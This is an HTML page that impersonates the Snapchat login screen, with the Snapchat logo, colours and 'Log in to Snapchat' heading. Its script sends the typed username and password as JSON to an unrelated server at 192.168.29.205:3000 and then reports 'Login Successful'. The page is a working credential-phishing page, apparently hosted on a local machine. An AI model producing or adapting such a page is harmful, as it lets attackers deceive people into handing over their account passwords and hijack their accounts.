<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Snapchat Login</title>

<style>
  *{margin:0;padding:0;box-sizing:border-box;font-family:Arial, Helvetica, sans-serif;}

  body{
    background:#FFFC00;
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
  }

  .login-box{
    width:330px;
    background:white;
    border-radius:18px;
    padding:35px 28px;
    text-align:center;
    box-shadow:0 8px 28px rgba(0,0,0,0.15);
  }

  .logo{
    width:80px;
    margin:auto;
    margin-top:-70px;
    margin-bottom:10px;
  }

  .logo img{
    width:100%;
    filter:drop-shadow(0 3px 5px rgba(0,0,0,0.3));
  }

  h2{
    margin-bottom:6px;
    font-size:20px;
    font-weight:700;
  }

  p{
    font-size:13px;
    color:#555;
    margin-bottom:18px;
  }

  .input-field{
    width:100%;
    padding:12px;
    margin:6px 0;
    border-radius:10px;
    border:1px solid #ddd;
    font-size:15px;
    outline:none;
    transition:.15s;
  }

  .input-field:focus{
    border-color:#FFFC00;
    box-shadow:0 0 8px rgba(255,255,0,0.45);
  }

  .btn{
    width:100%;
    background:black;
    color:white;
    border:none;
    padding:14px;
    border-radius:12px;
    font-size:16px;
    font-weight:700;
    cursor:pointer;
    margin-top:10px;
    transition:.1s;
  }

  .btn:active{ transform:scale(.97); }

  .footer{
    margin-top:10px;
    font-size:13px;
    color:#333;
  }
  .footer a{ color:black; font-weight:700; text-decoration:none; }

  .msg{
    height:20px;
    margin-top:6px;
    font-size:14px;
    font-weight:600;
  }
</style>
</head>

<body>

<div class="login-box">
  
  <div class="logo">
    <img src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1200px-Snapchat_logo.svg.png">
  </div>

  <h2>Log in to Snapchat</h2>
  <p>Enter your account details</p>

  <form id="loginForm">
    <input id="username" class="input-field" type="text" placeholder="Username or email" required>
    <input id="password" class="input-field" type="password" placeholder="Password" required>

    <button class="btn" type="submit">Log In</button>
    <div id="msg" class="msg"></div>
  </form>

  <div class="footer">
    Don’t have an account? <a href="#">Sign Up</a>
  </div>
</div>

<script>
  const msgEl = document.getElementById("msg");

  function showMsg(msg, ok=true){
    msgEl.textContent = msg;
    msgEl.style.color = ok ? "green" : "red";
  }

  document.getElementById("loginForm").addEventListener("submit", async (e)=>{
    e.preventDefault();

    const username = document.getElementById("username").value.trim();
    const password = document.getElementById("password").value.trim();

    if(password.length < 8){
      showMsg("❌ Password must be 8+ characters", false);
      return;
    }

    try{
      const res = await fetch("http://192.168.29.205:3000/login", {

        method:"POST",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify({username,password})
      });

      const data = await res.json();

      if(data.success){
        showMsg("✅ Login Successful");
      } else {
        showMsg("❌ Incorrect username or password", false);
      }

    }catch(err){
      showMsg("⚠️ Server offline", false);
    }
  });
</script>

</body>
</html>
